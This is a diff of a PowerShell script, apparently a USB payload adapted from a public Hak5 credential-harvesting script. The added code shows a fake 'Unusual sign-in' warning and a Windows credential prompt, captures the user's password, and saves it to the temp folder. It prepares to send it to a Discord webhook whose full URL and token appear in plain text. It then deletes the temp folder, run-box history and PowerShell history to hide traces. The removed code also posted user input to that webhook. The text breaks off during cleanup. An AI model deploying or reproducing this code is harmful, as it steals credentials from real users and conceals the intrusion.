@@ -1,73 +1,129 @@
+#This is not my code. I very slightly modified it from https://github.com/hak5/usbrubberducky-payloads/blob/master/payloads/library/credentials/-RD-Credz-Plz/Credz-Plz.ps1, Made by I AM JACOBY
+
+
+
+<#
+
+.NOTES 
+	This is to generate the ui.prompt you will use to harvest their credentials
+#>
+
+function Get-Creds {
+do{
+$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
+   if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', $cred.Password).Password)) {
+    [System.Windows.Forms.MessageBox]::Show("Credentials can not be empty!")
+    Get-Creds
+}
+$creds = $cred.GetNetworkCredential() | fl
+return $creds
+  # ...
+
+  $done = $true
+} until ($done)
+
+}
+
+#----------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to pause the script until a mouse movement is detected
+#>
+
+function Pause-Script{
 Add-Type -AssemblyName System.Windows.Forms
-Add-Type -AssemblyName System.Drawing
+$originalPOS = [System.Windows.Forms.Cursor]::Position.X
+$o=New-Object -ComObject WScript.Shell
 
-# Delay 5–10 minutes
-Start-Sleep -Seconds (Get-Random -Minimum 300 -Maximum 600)
-
-$maxAttempts = 3
-$attempt = 0
-$responseCaptured = $false
-$webhookUrl = "https://discord.com/api/webhooks/1367319520418467910/1sSKW35i7Qqah4PznlpvluRoa9gqom-qPH7-Ur9Mq0EfdumYH8uJdjLuyE3EAUcUIXRN"
-
-while (-not $responseCaptured -and $attempt -lt $maxAttempts) {
-    $form = New-Object System.Windows.Forms.Form
-    $form.Text = "Daily Feedback"
-    $form.Size = New-Object System.Drawing.Size(350,220)
-    $form.StartPosition = "CenterScreen"
-    $form.Topmost = $true
-    $form.ShowInTaskbar = $false
-
-    $label = New-Object System.Windows.Forms.Label
-    $label.Text = "Windows sxxsxsCredentials"
-    $label.AutoSize = $true
-    $label.Location = New-Object System.Drawing.Point(10,20)
-    $form.Controls.Add($label)
-
-    $textBox1 = New-Object System.Windows.Forms.TextBox
-    $textBox1.Size = New-Object System.Drawing.Size(300,20)
-    $textBox1.Location = New-Object System.Drawing.Point(10,50)
-    $form.Controls.Add($textBox1)
-
-    $label2 = New-Object System.Windows.Forms.Label
-    $label2.Text = "Username"
-    $label2.AutoSize = $true
-    $label2.Location = New-Object System.Drawing.Point(10,80)
-    $form.Controls.Add($label2)
-
-    $textBox2 = New-Object System.Windows.Forms.TextBox
-    $textBox2.Multiline = $true
-    $textBox2.Size = New-Object System.Drawing.Size(300,40)
-    $textBox2.Location = New-Object System.Drawing.Point(10,100)
-    $form.Controls.Add($textBox2)
-
-    $okButton = New-Object System.Windows.Forms.Button
-    $okButton.Text = "OK"
-    $okButton.Location = New-Object System.Drawing.Point(240,150)
-    $okButton.Add_Click({
-        if ($textBox1.Text.Trim() -ne "" -or $textBox2.Text.Trim() -ne "") {
-            $form.Tag = @{
-                ShortAnswer = $textBox1.Text
-                Explanation = $textBox2.Text
-            }
-            $responseCaptured = $true
+    while (1) {
+        $pauseTime = 3
+        if ([Windows.Forms.Cursor]::Position.X -ne $originalPOS){
+            break
         }
-        $form.Close()
-    })
-    $form.Controls.Add($okButton)
-
-    $form.ShowDialog() | Out-Null
-    $attempt++
+        else {
+            $o.SendKeys("{CAPSLOCK}");Start-Sleep -Seconds $pauseTime
+        }
+    }
 }
 
-if ($responseCaptured) {
-    $results = $form.Tag
-    $payload = @{
-        content = "**Day Status:** $($results.ShortAnswer)`n**Explanation:** $($results.Explanation)"
-    } | ConvertTo-Json -Depth 4
+#----------------------------------------------------------------------------------------------------
 
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $payload -ContentType 'application/json'
-} else {
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{
-        content = "**User did not answer after $maxAttempts attempts.**"
-    } | ConvertTo-Json -Depth 4) -ContentType 'application/json'
+# This script repeadedly presses the capslock button, this snippet will make sure capslock is turned back off 
+
+function Caps-Off {
+Add-Type -AssemblyName System.Windows.Forms
+$caps = [System.Windows.Forms.Control]::IsKeyLocked('CapsLock')
+
+#If true, toggle CapsLock key, to ensure that the script doesn't fail
+if ($caps -eq $true){
+
+$key = New-Object -ComObject WScript.Shell
+$key.SendKeys('{CapsLock}')
 }
+}
+#----------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to call the function to pause the script until a mouse movement is detected then activate the pop-up
+#>
+
+Pause-Script
+
+Caps-Off
+
+Add-Type -AssemblyName System.Windows.Forms
+
+[System.Windows.Forms.MessageBox]::Show("Unusual sign-in. Please authenticate your Microsoft Account")
+
+$creds = Get-Creds
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to save the gathered credentials to a file in the temp directory
+#>
+
+echo $creds >> $env:TMP\$FileName
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to upload your files to dropbox
+#>
+
+# Send the summary as a Discord message
+$webhookUrl = "https://discord.com/api/webhooks/1367319520418467910/1sSKW35i7Qqah4PznlpvluRoa9gqom-qPH7-Ur9Mq0EfdumYH8uJdjLuyE3EAUcUIXRN"
+$payload = @{
+    username = "$env:USERNAME System Report"
+    content = $creds
+}
+
+#------------------------------------------------------------------------------------------------------------------------------------
+
+<#
+
+.NOTES 
+	This is to clean up behind you and remove any evidence to prove you were there
+#>
+
+# Delete contents of Temp folder 
+
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+
+# Delete run box history
+
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+
+# Delete powershell history
+
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+
+# Deletes contents of recycle bin
